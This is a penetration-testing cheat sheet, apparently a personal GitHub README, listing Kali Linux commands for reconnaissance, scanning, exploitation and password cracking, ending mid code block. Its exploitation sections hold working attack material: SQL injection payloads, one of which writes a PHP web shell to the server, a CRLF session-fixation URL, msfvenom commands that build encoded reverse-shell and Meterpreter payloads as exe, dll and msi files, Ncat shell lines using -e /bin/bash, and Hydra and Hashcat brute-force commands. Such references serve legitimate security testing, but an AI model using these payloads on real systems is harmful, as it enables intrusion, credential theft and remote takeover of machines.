# Penetration Testing Cheat Sheet

This is more of a checklist for myself. May contain useful tips and tricks.

Everything was tested on Kali Linux v2020.2 (64-bit).

For help with any of the tools write `<tool_name> -h | --help` or `man <tool_name>`.

Sometimes `-h` can be mistaken for a host or some other option. If that's the case, use `--help` instead or read the manual with `man`.

Some of these tools do the same tasks but get slightly different results, run everything you can.

If you didn't already, read the [OWASP Testing Guide v4](https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf).

## Table of Contents

**1. [Reconnaissance](#1-reconnaissance)**

* [Useful Websites](#1-reconnaissance-useful-websites)

* [Dmitry](#dmitry)

* [theHarvester](#theharvester)

* [FOCA](#foca)

* [Metagoofil](#metagoofil)

* [Fierce](#fierce)

* [dig](#dig)

* [DNSRecon](#dnsrecon)

* [Sublist3r](#sublist3r)

* [WhatWeb](#whatweb)

* [DirBuster](#dirbuster)

* [Parsero](#parsero)

* [SecLists](#seclists)

**2. [Scanning/Enumeration](#2-scanning-enumeration)**

* [Useful Websites](#2-scanning-useful-websites)

* [Nmap](#nmap)

* [Nikto](#nikto)

* [WPScan](#wpscan)

* [testssl.sh](#testssl-sh)

**3. [Gaining Access](#3-gaining-access)**

* [Useful Websites](#3-gaining-access-useful-websites)

* [HTTP Response Splitting](#http-response-splitting)

* [Cross-Site Scripting](#xss)

* [SQL Injection](#sql-injection)

* [sqlmap](#sqlmap)

* [dotdotpwn](#dotdotpwn)

* [Generate a Reverse Shell Payload for Python](#generate-a-reverse-shell-payload-for-python)

* [Generate a Reverse Shell Payload for Windows OS](#generate-a-reverse-shell-payload-for-windows-os)

**4. [Password Cracking](#4-password-cracking)**

* [Useful Websites](#4-password-cracking-useful-websites)

* [crunch](#crunch)

* [hash-identifier](#hash-identifier)

* [Hashcat](#hashcat)

* [Hydra](#hydra)

**5. [Miscellaneous](#5-miscellaneous)**

* [Useful Websites](#5-miscellaneous-useful-websites)

* [cURL](#curl)

* [Ncat](#ncat)

* [multi/handler](#multi-handler)

* [ngrok](#ngrok)

* [PowerShell Encoded Command](#powershell-encoded-command)

<p id="1-reconnaissance"/>

## 1. Reconnaissance

Keep in mind that some web applications are only accessible through older web browsers like Internet Explorer.

Keep in mind that some web applications may be missing the index page and may not redirect you to the home page at all. If that's the case, try to manually guess a full path to the home page or use [DirBuster](#dirbuster).

Search the Internet for default paths and files for a specific web application and possibly use the information gathered in combination with Google Dorks.

Don't forget to access a web server over an IP address because you may find server's default welcome page and/or some other content.

Inspect the Web Console for possible errors.

Inspect the source code for possible errors and comments.

<p id="1-reconnaissance-useful-websites"/>

### Useful Websites

[whois.domaintools.com](https://whois.domaintools.com)

[spyse.com](https://spyse.com)

[lookup.icann.org](https://lookup.icann.org)

[www.shodan.io](https://www.shodan.io)

[sitereport.netcraft.com](https://sitereport.netcraft.com)

[pgp.circl.lu](https://pgp.circl.lu)

[www.exploit-db.com/google-hacking-database](https://www.exploit-db.com/google-hacking-database)

[pentest-tools.com/information-gathering/google-hacking](https://pentest-tools.com/information-gathering/google-hacking)

[securityheaders.com](https://securityheaders.com)

<p id="dmitry"/>

### Dmitry

Gather information about a specified host:

```fundamental
dmitry -winseo dmitry_results.txt somesite.com
```

Use this one-liner to extract hostnames from the results:

```bash
grep -P -o "(?<=HostName\:)[^\s]+" dmitry_results.txt | sort -u
```

For more options run `man dmitry` or `dmitry -h`.

<p id="theharvester"/>

### theHarvester

Gather information about a specified host:

```fundamental
theHarvester -d somesite.com -l 500 -b google,bing,yahoo,linkedin -f /root/Desktop/theHarvester_results.xml
```

Make sure you specify a full path to an output file; otherwise, it will default to `/usr/lib/python3/dist-packages/theHarvester` directory.

Use this one-liner to extract hostnames from the results:

```bash
grep -P -o "(?<=\<hostname\>)[^\s]+?(?=\<\/hostname\>)" theHarvester_results.xml | sort -u
```

For more options run `theHarvester -h`.

<p id="foca"/>

### FOCA (Fingerprinting Organizations with Collected Archives)

Find metadata and hidden information in files.

Tested on Windows 10 Enterprise OS (64-bit).

Setup:

* download and install [MS SQL Server 2014 Express](https://www.microsoft.com/en-us/download/confirmation.aspx?id=42299) or greater,
* download and install [MS .NET Framework 4.7.1 Runtime](https://dotnet.microsoft.com/download/dotnet-framework/net471) or greater,
* download and install [MS Visual C++ 2010 (64-bit)](https://www.microsoft.com/en-us/download/details.aspx?id=14632) or greater,
* download and install [FOCA](https://github.com/ElevenPaths/FOCA/releases).

The GUI is very intuitive.

<p id="metagoofil"/>

### Metagoofil

Search and download specific or all files through Google Dorks:

```fundamental
metagoofil -d somesite.com -l 100 -n 100 -t pdf -w -o metagoofil_results
```

Use this one-liner to extract authors from PDFs:

```bash
for file in metagoofil_results/*; do pdfinfo $file; done | grep -P -o "(?<=Author\:).+" | sed 's/[[:space:]]//g' | sort -u
```

For more options run `metagoofil -h`.

<p id="fierce"/>

### Fierce

Interrogate a domain name server:

```fundamental
fierce -dns somesite.com -file fierce_std_results.txt

fierce -dns somesite.com -wordlist dnsmap.txt -file fierce_brt_results.txt
```

Fierce will by default perform brute force attack with a built-in wordlist.

You can find `dnsmap.txt` wordlist located at `/usr/share/wordlists/` directory or download it from [/dict/dnsmap.zip](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/blob/master/dict).

For more options run `fierce -h`.

<p id="dig"/>

### dig

Interrogate a domain name server:

```fundamental
dig somesite.com ANY +noall +answer
```

Interrogate a specific domain name server:

```fundamental
dig @192.168.8.5 somesite.com ANY +noall +answer
```

Reverse DNS lookup:

```fundamental
dig -x 192.168.8.5 +noall +answer
```

For more options run `man dig` or `dig -h`.

<p id="dnsrecon"/>

### DNSRecon

Interrogate a domain name server:

```fundamental
dnsrecon -d somesite.com -t std --json /root/Desktop/dnsrecon_std_results.json

dnsrecon -d somesite.com -t axfr --json /root/Desktop/dnsrecon_axfr_results.json

dnsrecon -d somesite.com -t brt -D /usr/share/wordlists/dnsmap.txt --json /root/Desktop/dnsrecon_brt_results.json
```

DNSRecon can perform brute force attack with a user-defined wordlist but make sure you specify a full path to the wordlist; otherwise, DNSRecon might not recognize it. Also, make sure you specify a full path to an output file; otherwise, it will default to `/usr/share/dnsrecon/` directory.

You can find `dnsmap.txt` wordlist located at `/usr/share/wordlists/` directory or download it from [/dict/dnsmap.zip](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/blob/master/dict).

Reverse DNS lookup:

```fundamental
dnsrecon -d somesite.com -s -r 192.168.8.0/24 --json /root/Desktop/dnsrecon_reverse_results.json
```

Use this one-liner to extract hostnames from the results:

```bash
grep -P -o "(?<=\"name\"\:\ \")[^\s\"]+" /root/Desktop/dnsrecon_reverse_results.json | sort -u
```

For more options run `man dnsrecon` or `dnsrecon -h`.

<p id="sublist3r"/>

### Sublist3r

Installation:

```fundamental
apt-get install sublist3r
```

Enumerate subdomains using OSINT:

```fundamental
sublist3r -d somesite.com -o sublist3r_results.txt
```

For more options run `sublist3r -h`.

<p id="whatweb"/>

### WhatWeb

Identify a website:

```fundamental
whatweb -v somesite.com:80
```

For more options run `man whatweb` or `whatweb -h`.

<p id="dirbuster"/>

### DirBuster

Brute force directories and file names on a web server.

**Don't forget that GNU/Linux OS has a case sensitive file system.**

Don't forget to manually search for `robots.txt` as it may contain other file names and/or paths.

Don't forget to manually search for `phpinfo.php` as it may contain valuable information.

DirBuster might take a long time to finish depending on the settings and wordlist used.

| Common Responses |
| --- |
| 200 OK |
| 301 Moved Permanently |
| 302 Found |
| 401 Unauthorized |
| 403 Forbidden |
| 404 Not Found |
| 500 Internal Server Error |
| 503 Service Unavailable |

<p align="left"><img src="https://github.com/ivan-sincek/penetration-testing-cheat-sheet/blob/master/img/dirbuster.jpg" alt="DirBuster"></p>

All DirBuster's wordlists are located at `/usr/share/dirbuster/wordlists/` directory.

<p id="parsero"/>

### Parsero

Test all `robots.txt` entries:

```fundamental
parsero -u somesite.com -sb
```

For more options run `parsero -h`.

<p id="2-scanning-enumeration"/>

<p id="seclists"/>

### SecLists

Download a useful collection of multiple types of lists for security assessments.

Installation:

```fundamental
apt-get install seclists
```

Lists will be stored at `/usr/share/seclists/`.

Or, download the collection manually from [here](https://github.com/danielmiessler/SecLists/releases).

Also, check the one-time-password lists in [/dict/otp.zip](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/tree/master/dict).

## 2. Scanning/Enumeration

Keep in mind that web applications can also be hosted on other ports besides 80 (HTTP) and 443 (HTTPS).

Keep in mind that on ports 80 (HTTP) and 443 (HTTPS) a web server can host different web applications or something else entirely.

**Don't forget to use [Ncat](#ncat) and/or Telnet for banner grabbing.**

<p id="2-scanning-useful-websites"/>

### Useful Websites

[www.calculator.net/ip-subnet-calculator.html](https://www.calculator.net/ip-subnet-calculator.html)

[www.speedguide.net/ports.php](https://www.speedguide.net/ports.php)

<p id="nmap"/>

### Nmap

Ping sweep (map live hosts):

```fundamental
nmap -sn 192.168.8.0/24 -oN nmap_ping_sweep_results.txt
```

TCP scan (all ports):

```fundamental
nmap -nv -sS -sV -sC -Pn 192.168.8.0/24 -p- -oN nmap_tcp_results.txt
```

UDP scan (only important ports):

```fundamental
nmap -nv -sU -sV -sC -Pn 192.168.8.0/24 -p 53,67,68,69,88,123,135,137,138,139,161,162,389,445,500,514,631,1900,4500 -oN nmap_udp_results.txt
```

| Option | Description |
| --- | --- |
| -n/-R | Never do DNS resolution/Always resolve [default: sometimes] |
| -v | Increase verbosity level (use -vv or more for greater effect) |
| -Pn | Treat all hosts as online -- skip host discovery |
| -A | Enable OS detection, version detection, script scanning and traceroute |
| -sS/sT/sA | TCP SYN/Connect()/ACK |
| -sV | Probe open ports to determine service/version info |
| -sn | Ping scan - disable port scan |
| -p/-p- | Only scan specified ports/Scan all ports |
| --top-ports | Scan <number> most common ports |
| --script | Script scan (takes time to finish) |
| --script-args | Provide arguments to scripts |
| --script-help | Show help about scripts |
| -sC | Same as --script=default |
| -O | Enable OS detection |
| --reason | Display the reason a port is in a particular state |
| -oN/-oX/-oG | Output scan in normal, XML and Grepable format |

For more options run `man nmap` or `nmap -h`.

All Nmap's scripts are located at `/usr/share/nmap/scripts/` directory. Read more about them [here](https://nmap.org/nsedoc).

NSE examples:

```fundamental
nmap -nv -Pn 192.168.8.5 -p 445 --script="smb-enum-users, smb-enum-shares"

nmap -nv -Pn 192.168.8.5 -p 3306 --script="mysql-brute" --script-args="userdb='users.txt', passdb='rockyou.txt'"
```

You can find `rockyou.txt` wordlist located at `/usr/share/wordlists/` directory or download it from [/dict/rockyou.zip](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/blob/master/dict).

It is advisable to use IPs instead of domain names.

### Nikto

Scan a web server:

```fundamental
nikto -h somesite.com -p 80 -output nikto_results.txt
```

For more options run `man nikto` or just `nikto`.

Additionally, use premium tools such as [Nessus](https://www.tenable.com/products/nessus) and [Burp Suite](https://portswigger.net/burp) if you can afford them.

<p id="wpscan"/>

### WPScan

Scan a WordPress website:

```fundamental
wpscan --url somesite.com:80 -o wpscan_results.txt
```

For more options run `man wpscan` or `wpscan -h`.

<p id="testssl-sh"/>

### testssl.sh

Setup:

```fundamental
git clone https://github.com/drwetter/testssl.sh
cd testssl.sh
chmod +x testssl.sh
```

Test an SSL/TLS certificate (i.e. SSL/TLS ciphers, protocols, etc.):

```fundamental
./testssl.sh somesite.com:443
```

For more options run `./testssl.sh --help`.

<p id="3-gaining-access"/>

## 3. Gaining Access

**Always try null session login (i.e. no password login) or search the Internet for default credentials for a specific web application.**

Try to manipulate cookies to gain access or to escalate privileges.

**Always remember to delete your backdoors and other artifacts when you are done!**

<p id="3-gaining-access-useful-websites"/>

### Useful Websites

[www.exploit-db.com](https://www.exploit-db.com)

[www.cvedetails.com](https://www.cvedetails.com)

[www.securityfocus.com/vulnerabilities](https://www.securityfocus.com/vulnerabilities)

<p id="http-response-splitting"/>

### HTTP Response Splitting

Also known as CRLF Injection. CRLF refers to Carriage Return (ASCII 13, \\r) Line Feed (ASCII 10, \\n).

Fixate a session cookie:

```fundamental
somesite.com/redirect.asp?origin=somesite.com%0D%0ASet-Cookie:%20ASPSESSION=123456789
```

When encoded \\r refers to %0D and \\n refers to %0A.

<p id="xss"/>

### Cross-Site Scripting

Find out more about reflected and stored XSS attacks from my other [project](https://github.com/ivan-sincek/xss-catcher).

<p id="sql-injection"/>

### SQL Injection

Try to produce database errors by injecting a single-quote, back-slash, double-hyphen, forward-slash or period.

The following examples were tested on MySQL database.

Boolean-based SQLi:

```fundamental
' OR 1=1-- 
```

**Note that MySQL requires a space between the comment symbol and the next character.**

Union-based SQLi:

```fundamental
' UNION SELECT 1, 2, 3, 4-- 

' UNION SELECT 1, concat_ws(' | ', database(), current_user(), version()), 3, 4-- 

' UNION SELECT 1, concat_ws(' | ', table_schema, table_name, column_name, data_type, character_maximum_length), 3, 4 FROM information_schema.columns-- 

' UNION SELECT 1, load_file('..\\..\\apache\\conf\\httpd.conf'), 3, 4-- 
```

Use the union-based SQLi only when you are able to use the same communication channel to both launch the attack and gather results.

The goal is to determine the exact number of columns in the application query and to figure out which of them are displaying to the user.

Time-based SQLi:

```fundamental
' AND (SELECT 1 FROM (SELECT sleep(2)) test)-- 

' AND (SELECT 1 FROM (SELECT CASE current_user() WHEN 'root@localhost' THEN sleep(2) ELSE sleep(0) END) test)-- 

' AND (SELECT 1 FROM (SELECT CASE substring(current_user(), 1, 1) WHEN 'r' THEN sleep(2) ELSE sleep(0) END) test)-- 

' AND (SELECT CASE substring(password, 1, 1) WHEN '$' THEN sleep(2) ELSE sleep(0) END FROM schema.users WHERE id = 1)-- 
```

Use the time-based SQLi when you are not able to see the results.

Inject a simple web shell:

```fundamental
' UNION SELECT '', '', '', '<form method="post" action="./backdoor.php"><input name="command" type="text" value="<?php if (isset($_POST["command"])) { echo $_POST["command"]; } ?>" placeholder="Command"></form><?php if (isset($_POST["command"])) { echo "<pre>"; echo shell_exec($_POST["command"]); echo "</pre>"; } ?>' INTO DUMPFILE '..\\..\\htdocs\\backdoor.php'-- 
```

To successfully inject a web shell, the database user must have a write permission.

**Always make sure to properly close the surrounding code.**

<p id="sqlmap"/>

### sqlmap

Inject SQL code into request parameters:

```fundamental
sqlmap -a -u somesite.com/index.php?username=test&password=test

sqlmap -a -u somesite.com/index.php --data username=test&password=test
```

| Option | Description |
| --- | --- |
| -u | Target URL |
| --data | Data string to be sent through POST |
| --cookie | HTTP Cookie header value |
| --proxy | Use a proxy to connect to the target URL |
| --level | Level of tests to perform (1-5, default: 1) |
| --risk | Risk of tests to perform (1-3, default: 1) |
| -a | Retrieve everything |
| -b | Retrieve DBMS banner |
| --dump-all | Dump all DBMS databases tables entries |
| --os-shell | Prompt for an interactive operating system shell |
| --os-pwn | Prompt for an OOB shell, Meterpreter or VNC |
| --sqlmap-shell | Prompt for an interactive sqlmap shell |
| --wizard | Simple wizard interface for beginner users |

For more options run `man sqlmap`, `sqlmap -h` or `sqlmap -hh`.

<p id="dotdotpwn"/>

### dotdotpwn

Traverse a path (e.g. `somesite.com/../../../../etc/shadow`):

```fundamental
dotdotpwn -m http -h somesite.com

dotdotpwn -m http -u somesite.com/index.php?file=TRAVERSAL
```

| Option | Description |
| --- | --- |
| -m | Module \[http \| http-url \| ftp \| tftp \| payload \| stdout\] |
| -h | Hostname |
| -o | Operating System type if known ("windows", "unix" or "generic") |
| -d | Depth of traversals (default: 6) |
| -f | Specific filename (e.g. /etc/motd) |
| -u | URL with the part to be fuzzed marked as TRAVERSAL |
| -p | Filename with the payload to be sent and the part to be fuzzed marked with the TRAVERSAL keyword |
| -x | Port to connect (default: HTTP=80; FTP=21; TFTP=69) |
| -U | Username (default: 'anonymous') |
| -P | Password (default: 'dot@dot.pwn') |
| -M | HTTP Method to use when using the 'http' module \[GET \| POST \| HEAD \| COPY \| MOVE\] (default: GET) |
| -b | Break after the first vulnerability is found |

For more options simply run `dotdotpwn`.

<p id="generate-a-reverse-shell-payload-for-python"/>

### Generate a Reverse Shell Payload for Python

Find out how to generate a `reverse shell payload` for Python and send it to a target machine from my other [project](https://github.com/ivan-sincek/send-tcp-payload).

<p id="generate-a-reverse-shell-payload-for-windows-os"/>

### Generate a Reverse Shell Payload for Windows OS

To generate a `Base64 encoded payload` use one of the following MSFvenom commands (modify them to your need):

```fundamental
msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f raw -b \x00\x0a\x0d\xff | base64 -w 0 > /root/Desktop/payload.txt

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f raw -b \x00\x0a\x0d\xff | base64 -w 0 > /root/Desktop/payload.txt

msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/meterpreter_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f raw | base64 -w 0 > /root/Desktop/payload.txt

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f raw | base64 -w 0 > /root/Desktop/payload.txt
```

To generate a `binary file` use one of the following MSFvenom commands (modify them to your need):

```fundamental
msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f raw -b \x00\x0a\x0d\xff -o /root/Desktop/payload.bin

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f raw -b \x00\x0a\x0d\xff -o /root/Desktop/payload.bin

msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/meterpreter_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f raw -o /root/Desktop/payload.bin

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f raw -o /root/Desktop/payload.bin
```

To generate a `DLL file` use one of the following MSFvenom commands (modify them to your need):

```fundamental
msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f dll -b \x00\x0a\x0d\xff -o /root/Desktop/payload.dll

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f dll -b \x00\x0a\x0d\xff -o /root/Desktop/payload.dll
```

To generate a `standalone executable` file use one of the following MSFvenom commands (modify them to your need):

```fundamental
msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f exe -b \x00\x0a\x0d\xff -o /root/Desktop/payload.exe

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f exe -b \x00\x0a\x0d\xff -o /root/Desktop/payload.exe

msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/meterpreter_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f exe -o /root/Desktop/payload.exe

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f exe -o /root/Desktop/payload.exe
```

To generate an `MSI file` use one of the following MSFvenom commands (modify them to your need):

```fundamental
msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f msi -b \x00\x0a\x0d\xff -o /root/Desktop/payload.msi

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f msi -b \x00\x0a\x0d\xff -o /root/Desktop/payload.msi
```

Bytecode might not work on the first try due to some other bad characters. Trial and error is the key.

So far there is no easy way to generate a DLL nor MSI file with a stageless meterpreter shell due to the size issues.

<p id="4-password-cracking"/>

## 4. Password Cracking

**Google a hash before trying to crack it because you might save yourself a lot of time and trouble.**

Use Google Dorks to find files and within file's metadata a domain username to brute force or use [FOCA](#foca).

Keep in mind that you might lockout someone's account.

Keep in mind that some web forms implement CAPTCHA and/or hidden submission tokens which prevents you from brute forcing.

You can find a bunch of wordlists located at `/usr/share/seclists/` directory.

<p id="4-password-cracking-useful-websites"/>

### Useful Websites

[gchq.github.io/CyberChef](https://gchq.github.io/CyberChef/)

[www.onlinehashcrack.com](https://www.onlinehashcrack.com)

[hashkiller.io/listmanager](https://hashkiller.io/listmanager)

[crackstation.net](https://crackstation.net)

<p id="crunch"/>

### crunch

Generate a lower-alpha-numeric wordlist:

```fundamental
crunch 4 6 -f /usr/share/crunch/charset.lst lalpha-numeric -o crunch_wordlist.txt
```

You can see the list of all available charsets or add your own in `charset.lst` located at `/usr/share/crunch/` directory.

Generate all the possible permutations for specified words:

```fundamental
crunch -o crunch_wordlist.txt -p admin 123 \!\"

crunch -o crunch_wordlist.txt -q words.txt
```

Generate all the possible combinations for a specified charset:

```fundamental
crunch 4 6 -o crunch_wordlist.txt -p admin123\!\"
```

| Option | Description |
| --- | --- |
| -d | Limits the number of consecutive characters |
| -f | Specifies a character set from a file |
| -i | Inverts the output |
| -l | When you use the -t option this option tells crunch which symbols should be treated as literals |
| -o | Specifies the file to write the output to |
| -p | Tells crunch to generate/permute words that don't have repeating characters |
| -q | Tells crunch to read a file and permute what is read |
| -r | Tells crunch to resume generate words from where it left off, -r only works if you use -o |
| -s | Specifies a starting string |
| -t | Specifies a pattern |

For more options run `man crunch` or `crunch -h`.

| Placeholder | Description |
| --- | --- |
| \@ | Lower case characters |
| \, | Upper case characters |
| \% | Numbers |
| \^ | Symbols |

**Unfortunately there is no placeholder ranging from lowercase-alpha to symbols.**

Generate all the possible combinations for a specified placeholder:

```fundamental
crunch 10 10 -o crunch_wordlist.txt -t admin%%%^^

crunch 10 10 -o crunch_wordlist.txt -t admin%%%^^ -d 2% -d 1^

crunch 10 10 + + 123456 \!\" -o crunch_wordlist.txt -t admin@@%^^

crunch 10 10 -o crunch_wordlist.txt -t @dmin@@%^^ -l @aaaaaaaaa
```

<p id="hash-identifier"/>

### hash-identifier

To identify a hash type, run the following tool:

```fundamental
hash-identifier
```

<p id="hashcat"/>

### Hashcat

Brute force MD5 hashes:

```fundamental
hashcat -m 0 -a 3 --session=cracking --force --status --optimized-kernel-enable hashes.txt --outfile hashcat_results.txt
```

Brute force NetNTLMv1 hashes:

```fundamental
hashcat -m 5500 -a 3 --session=cracking --force --status --optimized-kernel-enable hashes.txt --outfile hashcat_results.txt
```

Use `--session=<session_name>` so that you can continue your cracking progress later on with `--restore`.

Continue cracking progress:

```fundamental
hashcat --session=cracking --restore
```

| Option | Description |
| --- | --- |
| -m | Hash-type, see references below |
| -a | Attack-mode, see references below |
| --force | Ignore warnings |
| --status | Enable automatic update of the status screen |
| --session | Define specific session name |
| --runtime | Abort session after X seconds of runtime |
| --restore | Restore session from --session |
| --restore-file-path | Specific path to restore file |
| --outfile | Define outfile for recovered hash |
| --show | Show cracked passwords found in potfile |
| --optimized-kernel-enable | Enable optimized kernels (limits password length) |
| -1 | User-defined charset ?1 |
| -2 | User-defined charset ?2 |
| -3 | User-defined charset ?3 |
| -4 | User-defined charset ?4 |

For more options run `man hashcat` or `hashcat -h`.

**When specifying a user-defined charset escape `?` with another `?` (i.e. use `??` instead of `\?`).**

| Hash Type | Description |
| --- | --- |
| 0 | MD5 |
| 100 | SHA1 |
| 200  | MySQL323 |
| 300  | MySQL4.1/MySQL5 |
| 1000 | NTLM |
| 1400 | SHA256 |
| 1700 | SHA512 |
| 2500 | WPA/WPA2 |
| 5500 | NetNTLMv1-VANILLA / NetNTLMv1-ESS |
| 5600 | NetNTLMv2 |

For more hash types read the manual.

| Attack Mode | Name |
| --- | --- |
| 0 | Straight |
| 1 | Combination |
| 2 | Toggle Case |
| 3 | Brute Force |
| 4 | Permutation |
| 5 | Table Lookup |
| 8 | Prince |

| Charset | Description |
| --- | --- |
| \?l | abcdefghijklmnopqrstuvwxyz |
| \?u | ABCDEFGHIJKLMNOPQRSTUVWXYZ |
| \?d | 0123456789 |
| \?s | \!\"\#\$\%\&\'\(\)\*\+\,\-\.\/\:\;\<\=\>\?\@\[\]\^\_\`\{\|\}\~ |
| \?a | \?l\?u\?d\?s |
| \?b | 0x00 - 0xff |

Dictionary attack:

```fundamental
hashcat -m 100 -a 0 --session=cracking --force --status --optimized-kernel-enable B1B3773A05C0ED0176787A4F1574FF0075F7521E rockyou.txt
```

You can find `rockyou.txt` wordlist located at `/usr/share/wordlists/` directory or download it from [/dict/rockyou.zip](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/blob/master/dict).

Brute force a hash with a specified placeholder:

```fundamental
hashcat -m 0 -a 3 --session=cracking --force --status --optimized-kernel-enable cc158fa2f16206c8bd2c750002536211 -1 ?l?u -2 ?d?s ?1?l?l?l?l?l?2?2

hashcat -m 0 -a 3 --session=cracking --force --status --optimized-kernel-enable 85fb9a30572c42b19f36d215722e1780 -1 \!\"\#\$\%\&\/\(\)\=??\* -2 ?d?1 ?u?l?l?l?l?2?2?2
```

<p id="hydra"/>

### Hydra

Crack an HTTP POST web form login:

```fundamental
hydra -l admin -P rockyou.txt somesite.com http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed!" -o hydra_results.txt
```

When cracking a web form login you must specify `Login=Login:<expected_message>` to distinguish between a successful login and failed one. Each expected message can vary between web forms.

Keep in mind that the `username` and `password` request parameters can be named differently.

Crack a Secure Shell login:

```fundamental
hydra -L users.txt -P rockyou.txt 192.168.8.5 ssh -o hydra_results.txt
```

You can find `rockyou.txt` wordlist located at `/usr/share/wordlists/` directory or download it from [/dict/rockyou.zip](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/blob/master/dict).

Also, check the one-time-password lists in [/dict/otp.zip](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/tree/master/dict).

| Option | Description |
| --- | --- |
| -R | Restore a previous aborted/crashed session |
| -S | Perform an SSL connect |
| -s | If the service is on a different default port, define it here |
| -l | Login with a login name |
| -L | Load several logins from a file |
| -p | Login with a password |
| -P | Load several passwords from a file |
| -x MIN:MAX:CHARSET | Password brute force generation, type "-x -h" to get help |
| -y | Disable use of symbols in bruteforce |
| -e nsr | Try "n" null password, "s" login as pass and/or "r" reversed login |
| -M | List of servers to attack, one entry per line, ':' to specify port |
| -f/-F | Exit when a login/pass pair is found (-M: -f per host, -F global) |
| -o | Write found login/password pairs to a file instead of stdout |
| -O | Use old SSL v2 and v3 |

For more options run `man hydra` or `hydra -h`.

| Supported Services |
| --- |
| ftp\[s\] |
| http\[s\]\-\{get\|post\}\-form |
| mysql |
| smb |
| smtp\[s\] |
| snmp |
| ssh |
| telnet\[s\] |
| vnc |

For more supported services read the manual.

| Brute Force Syntax | Description |
| --- | --- |
| MIN | Minimum number of characters in the password |
| MAX | Maximum number of characters in the password |
| CHARSET | Charset values are: "a" for lowercase letters, "A" for uppercase letters, "1" for numbers, and for all others, just add their real representation |

Brute force attack:

```fundamental
hydra -l admin -x 4:4:aA1\!\"\#\$\% 192.168.8.5 ftp -o hydra_results.txt
```

<p id="5-miscellaneous"/>

## 5. Miscellaneous

<p id="5-miscellaneous-useful-websites"/>

### Useful Websites

[archive.org](https://archive.org)

[isithacked.com](http://isithacked.com)

[haveibeenpwned.com](https://haveibeenpwned.com)

[jsonlint.com](https://jsonlint.com)

[www.base64decode.org](https://www.base64decode.org)

[www.urldecoder.org](https://www.urldecoder.org)

[raikia.com/tool-powershell-encoder](https://raikia.com/tool-powershell-encoder)

[bitly.com](https://bitly.com)

[www.getcreditcardnumbers.com](https://www.getcreditcardnumbers.com)

[www.first.org/cvss/calculator/3.0](https://www.first.org/cvss/calculator/3.0)

<p id="curl"/>

### cURL

Download a file:

```fundamental
curl somesite.com/somefile.txt --output somefile.txt
```

Test a server for various HTTP methods:

```fundamental
curl -v -X TRACE somesite.com

curl -v -X TRACE somesite.com --insecure

curl -v -X OPTIONS somesite.com --include

curl -v somesite.com --upload-file somefile.txt
```

For more options run `man curl` or `curl -h`.

<p id="ncat"/>

### Ncat

[Server] Set up a listener:

```fundamental
ncat -nvlp 9000

ncat -nvlp 9000 > received_data.txt

ncat -nvlp 9000 -e /bin/bash

ncat -nvlp 9000 -e /bin/bash --ssl

ncat -nvlp 9000 --keep-open <<< "HTTP/1.1 200 OK\r\n\r\n"
```

[Client] Connect to a remote host:

```fundamental
ncat -nv 192.168.8.5 9000

ncat -nv 192.168.8.5 9000 < sent_data.txt

ncat -nv 192.168.8.5 9000 -e /bin/bash

ncat -nv 192.168.8.5 9000 -e /bin/bash --ssl
```
For more options run `man ncat` or `ncat -h`.

<p id="multi-handler"/>

### multi/handler

Set up a `multi/handler` module (change the PAYLOAD, LHOST and LPORT as needed):

```fundamental
msfconsole -q

use exploit/multi/handler

set PAYLOAD windows/shell_reverse_tcp

set LHOST 127.0.0.1

set LPORT 9000

exploit
```

<p id="ngrok"/>

### ngrok

Use [ngrok](https://ngrok.com/download) to give your local web server a public address (if required) but do not expose the web server for too long if it is not properly hardened due to security concerns.

I would also advise you not to transfer any sensitive data over it, just in case.

<p id="powershell-encoded-command"/>

### PowerShell Encoded Command

To generate a PowerShell encoded command from a PowerShell script, run the following PowerShell command:

```pwsh
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes([IO.File]::ReadAllText($script)))
```

To run the PowerShell encoded command, run the following command from either PowerShell or Command Prompt:

```pwsh
